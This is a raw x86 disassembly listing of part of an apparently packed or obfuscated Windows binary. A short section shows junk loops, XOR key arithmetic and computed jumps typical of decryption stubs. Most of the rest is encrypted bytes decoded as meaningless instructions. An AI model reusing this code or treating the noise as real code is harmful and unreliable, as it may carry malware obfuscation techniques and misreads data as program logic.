  402908:	sar    BYTE PTR [ecx-0x2d],1
  40290b:	andps  xmm4,XMMWORD PTR [ebx]
  40290e:	and    ebp,DWORD PTR [eax]
  402910:	jns    0x402920
  402912:	es stc 
  402914:	rol    DWORD PTR [ecx*2-0x2e1631ac],cl
  40291b:	out    0x40,eax
  40291d:	jge    0x402933
  40291f:	jae    0x4028b5
  402921:	idiv   DWORD PTR [edi+0x39]
  402924:	loope  0x40297b
  402926:	add    ebx,DWORD PTR [esi]
  402928:	adc    esp,DWORD PTR [edx+0x12]
  40292b:	jmp    0xd0408fb7
  402930:	push   eax
  402931:	scas   al,BYTE PTR es:[edi]
  402932:	xchg   ecx,eax
  402933:	dec    ebp
  402934:	dec    edx
  402935:	mov    edx,0xe19842a3
  40293a:	cmp    BYTE PTR [esi+ecx*4],cl
  40293d:	mov    ch,0x86
  40293f:	call   0xae83d0e5
  402944:	sub    eax,0xde55173
  402949:	out    0xda,al
  40294b:	or     BYTE PTR [esi],dh
  40294d:	ins    BYTE PTR es:[edi],dx
  40294e:	cld    
  40294f:	jmp    0x7251013c
  402954:	and    eax,0x34a7ee9a
  402959:	cmp    edi,DWORD PTR [esi]
  40295b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40295c:	inc    esp
  40295d:	sub    BYTE PTR [edx],ch
  40295f:	stc    
  402960:	xor    BYTE PTR [edi-0x310703a],0xfe
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fd5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e76f
  402988:	sbb    DWORD PTR ds:0x42e793,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fd69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fd69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fd69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e1ac
  4029bc:	push   0x42e783
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e4cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fd69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fd69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e77f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e77f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e77f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e353
  402a0d:	cmp    DWORD PTR ds:0x42e77f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e77f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e77f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e77f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e77f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fe2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fd55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e1a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e1a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e1a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e1a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e1a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e1a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e1c1
  402ab3:	call   DWORD PTR ds:0x42e4d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x42a1adcd
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0xb70707e
  402afd:	inc    esi
  402afe:	jge    0x402b19
  402b00:	or     al,0xe3
  402b02:	add    bl,BYTE PTR [edx]
  402b04:	xor    al,0x9
  402b06:	pop    es
  402b07:	pop    ecx
  402b08:	aas    
  402b09:	or     eax,0x66395f63
  402b0e:	sbb    edx,eax
  402b10:	ins    DWORD PTR es:[edi],dx
  402b11:	outs   dx,BYTE PTR ds:[esi]
  402b12:	or     DWORD PTR [edi+0x67e37ce3],ecx
  402b18:	test   BYTE PTR [ebx-0x42],dh
  402b1b:	pop    esi
  402b1c:	pop    ss
  402b1d:	sub    bl,BYTE PTR [ebx+ecx*2+0x6a]
  402b21:	adc    eax,0x17464970
  402b26:	and    eax,0x39104c67
  402b2b:	sbb    BYTE PTR [ebx],0x1b
  402b2e:	test   DWORD PTR [esi-0x37],eax
  402b31:	jo     0x402b6a
  402b33:	pusha  
  402b34:	sub    ebx,DWORD PTR [edx-0x685e15a6]
  402b3a:	adc    al,0x33
  402b3c:	out    0xcb,al
  402b3e:	sbb    ah,dl
  402b40:	jmp    0xee79719f
  402b45:	dec    edx
  402b46:	add    BYTE PTR [ecx],bh
  402b48:	jmp    0xff49:0x9e7eeff7
  402b4f:	or     BYTE PTR [ebx],bl
  402b51:	js     0x402b6a
  402b53:	int    0x9
  402b55:	ins    BYTE PTR es:[edi],dx
  402b56:	fldenv [eax+0x6702b3c4]
  402b5c:	outs   dx,BYTE PTR ds:[esi]
  402b5d:	out    0xb4,eax
  402b5f:	out    dx,al
  402b60:	mov    ch,BYTE PTR ds:0xf509efe2
  402b66:	mov    ecx,0xe2a005ac
  402b6b:	stc    
  402b6c:	nop
  402b6d:	jmp    0x6e01:0x230160f0
  402b74:	sub    DWORD PTR [ecx-0x5de1ca4b],ebp
  402b7a:	test   DWORD PTR [eax],eax
  402b7c:	pop    ss
  402b7d:	sbb    al,0x93
  402b7f:	add    ebx,DWORD PTR [edi-0x1d]
  402b82:	gs xlat BYTE PTR fs:[ebx]
  402b85:	neg    BYTE PTR [esi*8+0x27f1def]
  402b8c:	sub    edi,esp
  402b8e:	and    eax,0xf8c0d703
  402b93:	add    ch,BYTE PTR [eax]
  402b95:	into   
  402b96:	push   ecx
  402b97:	or     al,0x29
  402b99:	stos   DWORD PTR es:[edi],eax
  402b9a:	fstp   DWORD PTR [edi+0x3e]
  402b9d:	inc    edx
  402b9e:	int    0xdf
  402ba0:	pop    ss
  402ba1:	pop    esi
  402ba2:	cmp    eax,0x29a5ecb3
  402ba7:	mov    dl,0x52
  402ba9:	xlat   BYTE PTR ds:[ebx]
  402baa:	popf   
  402bab:	out    dx,eax
  402bac:	or     DWORD PTR ds:0xf6711c8,esi
  402bb2:	ins    BYTE PTR es:[edi],dx
  402bb3:	push   cs
  402bb4:	fidivr WORD PTR [esi]
  402bb6:	outs   dx,DWORD PTR ds:[esi]
  402bb7:	push   ebp
  402bb8:	fst    QWORD PTR [ecx]
  402bba:	jbe    0x402bd9
  402bbc:	fs dec esi
  402bbe:	jmp    0x34a5d259
  402bc3:	push   0x306cf8a7
  402bc8:	jp     0x402c47
  402bca:	push   edi
  402bcb:	in     al,0xa2
  402bcd:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  402bcf:	and    BYTE PTR [ebx+0x3fbc5e26],bh
  402bd5:	sbb    eax,0x134e51fd
  402bda:	hlt    
  402bdb:	pop    edi
  402bdc:	cld    
  402bdd:	jo     0x402b7a
  402bdf:	xlat   BYTE PTR ds:[ebx]
  402be0:	dec    esp
  402be1:	push   es
  402be2:	pop    ecx
  402be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402be4:	pop    ds
  402be5:	into   
  402be6:	pop    esp
  402be7:	push   esi
  402be8:	iret   
  402be9:	xor    ebp,DWORD PTR [edx]
  402beb:	pop    edx
  402bec:	stos   DWORD PTR es:[edi],eax
  402bed:	or     BYTE PTR [ebp-0x5c7484a],dh
  402bf3:	aaa    
  402bf4:	std    
  402bf5:	inc    eax
  402bf6:	push   0xfd358c85
  402bfb:	and    DWORD PTR es:[ebp-0x778b8ac1],edi
  402c02:	loop   0x402be8
  402c04:	mov    ebx,0xf460303c
  402c09:	adc    eax,0x2f729834
  402c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c0f:	nop
  402c10:	jp     0x402c3b
  402c12:	pop    es
  402c13:	fwait
  402c14:	xor    cl,ah
  402c16:	pop    es
  402c17:	enter  0xed21,0xb6
  402c1b:	es ss lock cs push eax
  402c20:	(bad)  
  402c22:	pop    esi
  402c23:	mov    bl,0x8f
  402c25:	jae    0x402c23
  402c27:	pop    ecx
  402c28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c29:	les    ebp,FWORD PTR [eax-0x9ec1a51]
  402c2f:	mov    ecx,0xdfcbf5e7
  402c34:	iret   
  402c35:	fld    TBYTE PTR [edi+edx*8+0x75e9e96f]
  402c3c:	rcl    BYTE PTR [edx+0x79ed3a43],0xac
  402c43:	mov    al,0x9
  402c45:	test   BYTE PTR [eax+0x2aa6f051],dh
  402c4b:	jbe    0x402bdf
  402c4d:	add    eax,0x9d8d7eb9
  402c52:	inc    ecx
  402c53:	jne    0x402c1c
  402c55:	sar    BYTE PTR [ecx-0x7f],cl
  402c58:	repz mov edi,0xe1db657a
  402c5e:	popa   
  402c5f:	xchg   esi,eax
  402c60:	lahf   
  402c61:	jl     0x402c56
  402c63:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  402c65:	test   BYTE PTR [esi+0x5a89d888],0xdb
  402c6c:	and    bl,BYTE PTR [ebx+0x1829ea47]
  402c72:	push   esp
  402c73:	popf   
  402c74:	jle    0x402c4e
  402c76:	(bad)
  402c7a:	xchg   edx,eax
  402c7b:	imul   edi,edx,0xffffffae
  402c7e:	(bad)  
  402c7f:	mov    ebx,0xee896c32
  402c84:	lds    ebx,FWORD PTR [edi+0x3d]
  402c87:	pusha  
  402c88:	cmp    bh,al
  402c8a:	mov    BYTE PTR [esi+0x4f],bh
  402c8d:	in     eax,0xb6
  402c8f:	push   0xbdf24e4a
  402c94:	popf   
  402c95:	adc    eax,0x42eb8c1a
  402c9a:	xor    ecx,DWORD PTR ds:0xd95fce0d
  402ca0:	mov    dl,0xd5
  402ca2:	cmp    BYTE PTR [edx+0x1e7735ad],0xa0
  402ca9:	sub    al,0xa0
  402cab:	add    BYTE PTR [edx+0x167364fb],0x19
  402cb2:	dec    ebp
  402cb3:	pop    ebx
  402cb4:	add    eax,0xb2872740
  402cb9:	out    dx,al
  402cba:	or     dl,bh
  402cbc:	jnp    0x402cdd
  402cbe:	mov    ecx,0x157065c4
  402cc3:	mov    DWORD PTR [eax],esp
  402cc5:	dec    eax
  402cc6:	repz shl BYTE PTR [edx-0x3bc7da27],1
  402ccd:	shl    DWORD PTR [edi],0xb6
  402cd0:	push   edx
  402cd1:	mov    esi,0x1a629b15
  402cd6:	retf   0xbe87
  402cd9:	cli    
  402cda:	leave  
  402cdb:	adc    ch,al
  402cdd:	and    eax,0x552a9ac2
  402ce2:	les    edx,FWORD PTR [ecx-0x3b]
  402ce5:	pop    esp
  402ce6:	loop   0x402cf5
  402ce8:	iret   
  402ce9:	ins    DWORD PTR es:[edi],dx
  402cea:	scas   eax,DWORD PTR es:[edi]
  402ceb:	mov    BYTE PTR [edx-0xe377fae],ah
  402cf1:	arpl   WORD PTR ds:0x181f119d,dx
  402cf7:	(bad)  
  402cf8:	iret   
  402cf9:	fadd   QWORD PTR [eax-0x39]
  402cfc:	retf   
  402cfd:	std    
  402cfe:	sbb    DWORD PTR [edx],0xffffffea
  402d01:	bound  ecx,QWORD PTR [esi]
  402d03:	inc    edx
  402d04:	test   BYTE PTR [esi+0x4f856599],ah
  402d0a:	xchg   DWORD PTR [ecx],ebp
  402d0c:	jb     0x402cfd
  402d0e:	cmp    bl,BYTE PTR [edi-0x67]
  402d11:	jbe    0x402d1c
  402d13:	mov    ds:0x9e0fd589,eax
  402d18:	push   0x22c06772
  402d1d:	cmp    dh,BYTE PTR [ebx-0x65]
  402d20:	cmp    BYTE PTR [ecx+0x503ee432],dh
  402d26:	or     al,0xdf
  402d28:	xlat   BYTE PTR ds:[ebx]
  402d29:	pop    esp
  402d2a:	or     ebx,DWORD PTR [edx]
  402d2c:	jno    0x402ce8
  402d2e:	bswap  ebp
  402d30:	stos   DWORD PTR es:[edi],eax
  402d31:	outs   dx,DWORD PTR ds:[esi]
  402d32:	imul   esi,DWORD PTR [edi+0x78a16f82],0xadaccd8d
  402d3c:	xchg   edi,eax
  402d3d:	and    ch,bl
  402d3f:	popf   
  402d40:	scas   eax,DWORD PTR es:[edi]
  402d41:	mov    dh,0xef
  402d43:	sub    al,0x1e
  402d45:	mov    ebp,0x5deea89c
  402d4a:	lahf   
  402d4b:	mov    ebp,0x56139db4
  402d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d51:	push   ebp
  402d52:	adc    cl,ch
  402d54:	pop    ds
  402d55:	inc    esi
  402d56:	mov    ch,0x83
  402d58:	(bad)  
  402d59:	sbb    eax,0x3fb7f11f
  402d5e:	pop    ebp
  402d5f:	sti    
  402d60:	dec    ebp
  402d61:	cli    
  402d62:	int3   
  402d63:	bswap  ecx
  402d65:	mov    bh,0x8d
  402d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d68:	inc    edi
  402d69:	fisub  WORD PTR [ebp+0x15]
  402d6c:	mov    BYTE PTR [eax+0x13],dl
  402d6f:	iret   
  402d70:	int3   
  402d71:	loopne 0x402d41
  402d73:	or     al,0x84
  402d75:	push   ds
  402d76:	fdiv   QWORD PTR [esi]
  402d78:	pop    ebx
  402d79:	and    eax,edx
  402d7b:	(bad)  
  402d7d:	or     bh,bl
  402d7f:	xor    al,0xb6
  402d81:	push   esp
  402d82:	lods   eax,DWORD PTR ds:[esi]
  402d83:	mov    ecx,DWORD PTR [esi]
  402d85:	pop    es
  402d86:	out    0x31,al
  402d88:	cs enter 0xc9c7,0x66
  402d8d:	inc    eax
  402d8e:	or     bl,BYTE PTR [esi+ebp*4]
  402d91:	out    0x92,eax
  402d93:	push   esi
  402d94:	sbb    BYTE PTR [ebp+esi*8-0x57],al
  402d98:	or     al,0xac
  402d9a:	xchg   ebx,eax
  402d9b:	lds    ebx,FWORD PTR [ebp-0x62]
  402d9e:	or     BYTE PTR [edi+0x1c9fc894],bl
  402da4:	push   es
  402da5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402da6:	dec    ecx
  402da7:	push   edx
  402da8:	sbb    dh,BYTE PTR [esi+edx*8-0x332e9a3c]
  402daf:	fistp  QWORD PTR [ebp-0x57]
  402db2:	pop    esp
  402db3:	ffreep st(2)
  402db5:	call   0xa7004617
  402dba:	mov    ch,0xad
  402dbc:	sahf   
  402dbd:	xor    al,0x3
  402dbf:	(bad)  
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	test   al,0x4d
  402de1:	xchg   ebx,eax
  402de2:	pop    esi
  402de3:	mov    esi,0xbe70700a
  402de8:	jle    0x402e5a
  402dea:	jo     0x402da8
  402dec:	mov    edi,0xe080790a
  402df1:	bound  eax,QWORD PTR [ebp-0x5ebae6ad]
  402df7:	out    0xa7,eax
  402df9:	adc    BYTE PTR [eax-0x4bae33c5],ah
  402dff:	leave  
  402e00:	call   0xd54ee674
  402e05:	int    0x61
  402e07:	call   0x435a:0x5e5448d2
  402e0e:	cmp    eax,0x9702b5fb
  402e13:	adc    DWORD PTR [esi],edx
  402e15:	loop   0x402dda
  402e17:	adc    eax,0xfa47d811
  402e1c:	xchg   ebp,eax
  402e1d:	in     al,dx
  402e1e:	mov    ecx,0xd5ad120f
  402e23:	push   ds
  402e24:	sbb    al,0x86
  402e26:	jb     0x402dae
  402e28:	xlat   BYTE PTR ds:[ebx]
  402e2a:	jmp    FWORD PTR [ebp-0x3194d52c]
  402e30:	(bad)  
  402e31:	sub    ebp,ecx
  402e33:	rcr    cl,cl
  402e35:	sbb    dh,BYTE PTR [esi-0x5fcb0980]
  402e3b:	push   edx
  402e3c:	pop    es
  402e3d:	and    ebp,DWORD PTR [edi]
  402e3f:	in     al,dx
  402e40:	mov    al,ds:0x66d148de
  402e45:	push   ecx
  402e46:	fnsave ds:[eax]
  402e49:	jmp    0x402e93
  402e4b:	paddd  mm5,mm5
  402e4e:	xchg   ebp,eax
  402e4f:	sub    cl,BYTE PTR [edx+0x29e2bb31]
  402e55:	shr    ah,0x7b
  402e58:	jl     0x402e7d
  402e5a:	xchg   edx,eax
  402e5b:	cli    
  402e5c:	js     0x402e32
  402e5e:	int    0x66
  402e60:	repz mov ebx,0xc38fb4fb
  402e66:	cmp    DWORD PTR [edx+0x4044495c],0x916da2d6
  402e70:	test   DWORD PTR ds:0x895d2894,0xc5b2eec2
  402e7a:	push   eax
  402e7b:	retf   
  402e7c:	xchg   BYTE PTR [ebp-0x1d],ah
  402e7f:	jp     0x402edf
  402e81:	and    DWORD PTR [eax-0x63],ecx
  402e84:	add    ch,ch
  402e86:	daa    
  402e87:	retf   
  402e88:	jg     0x402e34
  402e8a:	lods   al,BYTE PTR ds:[esi]
  402e8b:	mov    ecx,esi
  402e8d:	push   ebx
  402e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e8f:	cdq    
  402e90:	dec    eax
  402e91:	jecxz  0x402ee4
  402e93:	add    bl,BYTE PTR [edi-0x4f4e9163]
  402e99:	dec    ebp
  402e9a:	mov    ebp,0x4a341f6c
  402e9f:	(bad)  
  402ea0:	les    edi,FWORD PTR [edx]
  402ea2:	gs out 0x23,ax
  402ea6:	inc    ebp
  402ea7:	ins    BYTE PTR es:[edi],dx
  402ea8:	pop    ebp
  402ea9:	je     0x402eec
  402eab:	aaa    
  402eac:	inc    ecx
  402ead:	scas   eax,DWORD PTR es:[edi]
  402eae:	mov    ch,0xcd
  402eb0:	jg     0x402e6c
  402eb2:	ds in  eax,dx
  402eb4:	mov    ds:0x349abc97,al
  402eb9:	and    cl,BYTE PTR [eax]
  402ebb:	jle    0x402f3a
  402ebd:	mov    edi,0x53778f1e
  402ec2:	dec    esi
  402ec3:	cs iret 
  402ec5:	dec    edx
  402ec6:	jae    0x402f28
  402ec8:	shr    BYTE PTR [ecx+0x1fdc19d],cl
  402ece:	and    DWORD PTR [esi],edx
  402ed0:	fucompp 
  402ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed3:	sbb    ebx,ebx
  402ed5:	shr    DWORD PTR [edi],cl
  402ed7:	int3   
  402ed8:	aam    0xa8
  402eda:	sti    
  402edb:	cmc    
  402edc:	xchg   ebp,eax
  402edd:	out    dx,al
  402ede:	xor    ebx,DWORD PTR [ecx+esi*4+0x5c]
  402ee2:	xchg   esp,eax
  402ee3:	sub    al,0x97
  402ee5:	adc    edi,esp
  402ee7:	(bad)  
  402ee8:	mov    esp,0x996ee27c
  402eed:	or     al,0xa7
  402eef:	call   0x5e150eb3
  402ef4:	push   esi
  402ef5:	jno    0x402e9b
  402ef7:	sbb    DWORD PTR [esi],eax
  402ef9:	js     0x402f3a
  402efb:	gs pop ecx
  402efd:	and    edi,edi
  402eff:	mov    ch,0x1d
  402f01:	stos   DWORD PTR es:[edi],eax
  402f02:	dec    edi
  402f03:	mov    al,0xb6
  402f05:	and    ecx,DWORD PTR [eax]
  402f07:	push   esp
  402f08:	cli    
  402f09:	xor    eax,0x9eefc209
  402f0e:	mov    esp,ecx
  402f10:	in     al,0xb8
  402f12:	imul   ebx,DWORD PTR [esi+0x5709f006],0xc83d937
  402f1c:	push   0x59623137
  402f21:	ds js  0x402fa0
  402f24:	pusha  
  402f25:	call   0x75dde448
  402f2a:	ins    BYTE PTR es:[edi],dx
  402f2b:	pop    ds
  402f2c:	push   edx
  402f2e:	pop    ebx
  402f2f:	(bad)  
  402f30:	shl    DWORD PTR [esi+0x259248dd],1
  402f36:	sub    al,0x7d
  402f38:	scas   eax,DWORD PTR es:[edi]
  402f39:	jo     0x402ed3
  402f3b:	mov    dl,0xbc
  402f3d:	add    ebp,esp
  402f3f:	shl    BYTE PTR [edx],cl
  402f41:	xlat   BYTE PTR ds:[ebx]
  402f42:	inc    esi
  402f43:	cmp    BYTE PTR [ecx+0x5e381d24],dl
  402f49:	dec    ebx
  402f4a:	dec    ebx
  402f4b:	out    0x1b,eax
  402f4d:	push   eax
  402f4e:	cmp    BYTE PTR [eax+0x2f],bl
  402f51:	in     eax,0x70
  402f53:	lahf   
  402f54:	into   
  402f55:	add    bh,BYTE PTR [edx+esi*8+0x602d1e4f]
  402f5c:	or     ebp,DWORD PTR [ebx-0x21]
  402f5f:	or     al,0xe9
  402f61:	or     ah,BYTE PTR [ebx+eax*1-0x152583d3]
  402f68:	jecxz  0x402f76
  402f6a:	out    dx,eax
  402f6b:	icebp  
  402f6c:	xchg   ebx,eax
  402f6d:	or     DWORD PTR [ebx],0x429213b
  402f73:	jmp    0x402f6c
  402f75:	repnz pop ds
  402f77:	int3   
  402f78:	sbb    al,BYTE PTR [ebp-0x48]
  402f7b:	(bad)  
  402f7c:	in     al,dx
  402f7d:	dec    edi
  402f7e:	jg     0x402f62
  402f80:	cli    
  402f81:	sar    ebp,1
  402f83:	jge    0x402f7b
  402f85:	mov    ah,0x39
  402f87:	push   eax
  402f88:	xor    DWORD PTR [edi-0x36],esi
  402f8b:	or     DWORD PTR [ebp+0x2e],eax
  402f8e:	push   0x2d
  402f90:	push   esp
  402f91:	mov    al,0x3e
  402f93:	pop    ss
  402f94:	push   edi
  402f95:	(bad)  
  402f97:	and    eax,0x161fea60
  402f9c:	int    0x74
  402f9e:	adc    al,0xc9
  402fa0:	jnp    0x402f82
  402fa2:	xor    DWORD PTR [eax+ebx*4-0x21c10fab],esp
  402fa9:	mov    al,ds:0x480255af
  402fae:	pop    esp
  402faf:	test   eax,0x4e1fadd5
  402fb4:	mov    esp,0xbbd7f1e4
  402fb9:	loope  0x402f69
  402fbb:	stc    
  402fbc:	pop    edx
  402fbd:	ins    BYTE PTR es:[edi],dx
  402fbe:	xor    BYTE PTR [ebp+0x60],bl
  402fc1:	dec    edx
  402fc2:	data16 clc 
  402fc4:	mov    ah,0xfa
  402fc6:	inc    edx
  402fc7:	out    dx,al
  402fc8:	mov    eax,0x4fe2f985
  402fcd:	cmp    DWORD PTR [edx+0x72b32138],ebx
  402fd3:	mov    edx,0x654e61ae
  402fd8:	mov    ah,0xf8
  402fda:	iret   
  402fdb:	pop    ss
  402fdc:	sub    BYTE PTR [ebp+esi*1+0x2d3b170c],0xe3
  402fe4:	jb     0x402fb8
  402fe6:	(bad)  
  402fe7:	(bad)  
  402fe8:	arpl   WORD PTR [edi+0x25],di
  402feb:	mov    bh,0xce
  402fed:	xor    edi,ecx
  402fef:	cwde   
  402ff0:	outs   dx,BYTE PTR ds:[esi]
  402ff1:	jno    0x402f82
  402ff3:	div    BYTE PTR [edx]
  402ff5:	scas   al,BYTE PTR es:[edi]
  402ff6:	loopne 0x403037
  402ff8:	mov    ch,0x47
  402ffa:	adc    al,0x90
  402ffc:	aam    0x14
  402ffe:	stos   DWORD PTR es:[edi],eax
  402fff:	inc    esi
  403000:	sub    BYTE PTR [ebx],dl
  403002:	in     al,0xda
  403004:	fcmovbe st,st(3)
  403006:	xchg   edi,eax
  403007:	sar    BYTE PTR [eax+edx*4],1
  40300a:	jo     0x403048
  40300c:	sub    DWORD PTR [edi+0x49ff615b],eax
  403012:	adc    eax,0x41695afc
  403017:	inc    esi
  403018:	les    ecx,FWORD PTR [esi-0x46]
  40301b:	mov    dl,0x9e
  40301d:	push   edi
  40301e:	jo     0x402fac
  403020:	jp     0x402fc8
  403022:	xchg   edx,eax
  403023:	stos   BYTE PTR es:[edi],al
  403024:	push   edx
  403025:	aam    0x3
  403027:	cli    
  403028:	std    
  403029:	inc    eax
  40302a:	jl     0x403021
  40302c:	add    al,0xc5
  40302e:	addr16 daa 
  403030:	cmc    
  403031:	(bad)  
  403032:	xor    dh,BYTE PTR [edx+0xb]
  403035:	push   ecx
  403036:	hlt    
  403037:	inc    ebx
  403038:	out    0x1e,al
  40303a:	out    dx,al
  40303b:	out    0xbc,al
  40303d:	lahf   
  40303e:	js     0x4030ba
  403040:	adc    dl,ch
  403042:	(bad)  
  403044:	out    dx,al
  403045:	mov    cl,0x80
  403047:	xchg   esp,eax
  403048:	dec    BYTE PTR [edi+0x22]
  40304b:	stos   BYTE PTR es:[edi],al
  40304c:	aad    0xbc
  40304e:	xchg   ecx,eax
  40304f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403050:	stos   DWORD PTR es:[edi],eax
  403051:	imul   eax,DWORD PTR [ebx+0x2b],0x424e296
  403058:	add    al,0x8
  40305a:	adc    eax,0xf6c78e07
  40305f:	popf   
  403060:	(bad)  
  403061:	lods   al,BYTE PTR ds:[esi]
  403062:	push   ebp
  403063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403064:	add    BYTE PTR [edi-0x3c],cl
  403067:	ficomp WORD PTR [ebx]
  403069:	adc    BYTE PTR [eax+0x4b8bb551],0x46
  403070:	sub    al,0xce
  403072:	mov    edx,0x51c95b74
  403077:	(bad)  
  403078:	jge    0x4030c7
  40307a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40307b:	and    DWORD PTR [esi],ebp
  40307d:	shl    DWORD PTR [edi+0x53],0xd4
  403081:	push   ecx
  403082:	xchg   esp,eax
  403083:	mov    dl,0xe1
  403085:	adc    al,0x95
  403087:	(bad)  
  403088:	ss pop edx
  40308a:	daa    
  40308b:	aaa    
  40308c:	jb     0x4030b1
  40308e:	cmp    eax,0x41af660d
  403093:	jl     0x403034
  403095:	mov    cl,0x88
  403097:	test   DWORD PTR [edx-0x67],ebp
  40309a:	jbe    0x4030db
  40309c:	ds test eax,0x904a87b7
  4030a2:	pop    esp
  4030a3:	sub    BYTE PTR [ebp+esi*4-0x34675b55],cl
  4030aa:	inc    ecx
  4030ab:	bound  esi,QWORD PTR [eax]
  4030ad:	mov    esi,0x32729c
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x3d
  4030ce:	int    0x71
  4030d0:	call   0x70b048d1
  4030d5:	mov    esi,0x2370707e
  4030da:	fisub  WORD PTR [esi]
  4030dc:	adc    DWORD PTR [esi+0x2cb41cf8],edx
  4030e2:	jecxz  0x403064
  4030e4:	jne    0x40313b
  4030e6:	add    edx,ebp
  4030e8:	sbb    al,0x94
  4030ea:	js     0x40314f
  4030ec:	sbb    esi,DWORD PTR [eiz*2-0x53390106]
  4030f3:	xchg   ecx,eax
  4030f4:	and    BYTE PTR [ebx-0x2b],bl
  4030f7:	repz jnp 0x40316c
  4030fa:	test   al,0xc8
  4030fc:	cli    
  4030fd:	jae    0x40312e
  4030ff:	test   eax,0xbcf5b976
  403104:	bound  eax,QWORD PTR [edi+ebp*1-0x74]
  403108:	lock ja 0x403172
  40310b:	in     eax,0x6d
  40310d:	scas   al,BYTE PTR es:[edi]
  40310e:	mov    esp,0x63e41d7a
  403113:	sbb    al,0x3c
  403115:	retf   
  403116:	ficomp WORD PTR [ecx+0x72e23365]
  40311c:	test   edx,0x534fed21
  403122:	jae    0x4030c5
  403124:	fcomi  st,st(1)
  403126:	push   ecx
  403127:	fdiv   QWORD PTR [edi]
  403129:	hlt    
  40312a:	imul   eax,DWORD PTR ds:0x4f8adbb9,0x1006d507
  403134:	mov    edi,0xd9ab0824
  403139:	and    DWORD PTR [edx-0x5ff4d4d3],ebx
  40313f:	add    BYTE PTR [ecx-0x56],ah
  403142:	and    al,0x6f
  403144:	cmp    DWORD PTR [edi],edx
  403146:	inc    eax
  403147:	ss ss pushf 
  40314a:	dec    ebp
  40314b:	jp     0x40319d
